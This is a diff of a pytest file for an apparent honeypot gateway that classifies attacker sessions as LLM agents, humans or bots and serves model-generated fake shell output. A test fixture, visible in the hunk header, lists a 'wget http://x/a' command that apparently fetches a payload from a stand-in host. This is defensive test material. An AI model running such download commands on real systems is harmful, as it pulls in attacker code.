@@ -371,21 +371,30 @@ HIGH_RISK = [*LOW, {"ts": "2025-07-01T00:00:02+00:00", "input": "wget http://x/a
 
 
 def learned_run(persona, deid, tier, commands, backend, history=()):
-    """Escalate lsblk through a learned-mode gateway whose tier model always answers tier."""
+    """Escalate lsblk through a learned-mode gateway whose tier model answers tier, or a tuple's majority with its share as probability."""
+    tiers = list(tier) if isinstance(tier, tuple) else [tier]
     db = FakeDb(deid, commands=commands)
     gw = Gateway(GatewayConfig(token="t" * 16, canary="ref-canary"), db, backend, persona)
-    gw.classifiers = {**CLASSIFIERS, "tier": {"features": list(FEATURES), "model": DummyClassifier(strategy="constant", constant=tier).fit([[0] * len(FEATURES)], [tier])}}
+    gw.classifiers = {**CLASSIFIERS, "tier": {"features": list(FEATURES), "model": DummyClassifier(strategy="prior").fit([[0] * len(FEATURES)] * len(tiers), tiers)}}
     req = EscalationRequest(session="s1", src_ip="198.51.100.9", username="root", argv=["lsblk"], history=list(history))
     return asyncio.run(gw.escalate(req)), db
 
 
-@pytest.mark.parametrize("tier, commands", [("llm_agent", LOW), ("human", LOW), ("bot", HIGH_RISK)])
-def test_learned_mode_escalates_agents_humans_and_risky_bots(persona, deid, tier, commands):
-    """LLM agents, humans and bots that reached R3 or R4 still get a model answer, with the decision logged."""
+@pytest.mark.parametrize(
+    "tier, commands, reason",
+    [
+        ("llm_agent", LOW, "learned:llm_agent:1.0:"),
+        ("human", LOW, "learned:human:1.0:"),
+        ("bot", HIGH_RISK, "learned:bot:1.0:R4:"),
+        (("bot", "bot", "bot", "llm_agent", "llm_agent"), LOW, "learned:bot:0.6:R1:"),
+    ],
+)
+def test_learned_mode_escalates_agents_humans_and_risky_or_unsure_bots(persona, deid, tier, commands, reason):
+    """LLM agents, humans, bots that reached R3 or R4 and sessions below 0.9 bot probability still get a model answer, with the decision logged."""
     backend = FakeBackend(answer("NAME MAJ:MIN\n"))
     result, _ = learned_run(persona, deid, tier, commands, backend)
     assert result.outcome == "generated" and backend.calls == 1
-    assert any(r.startswith(f"learned:{tier}:") for r in result.reasons)
+    assert any(r.startswith(reason) for r in result.reasons)
 
 
 @pytest.mark.parametrize("commands, history", [(LOW, ()), (LOW[:1], ()), ([], ("uname -a", "uname -a"))])
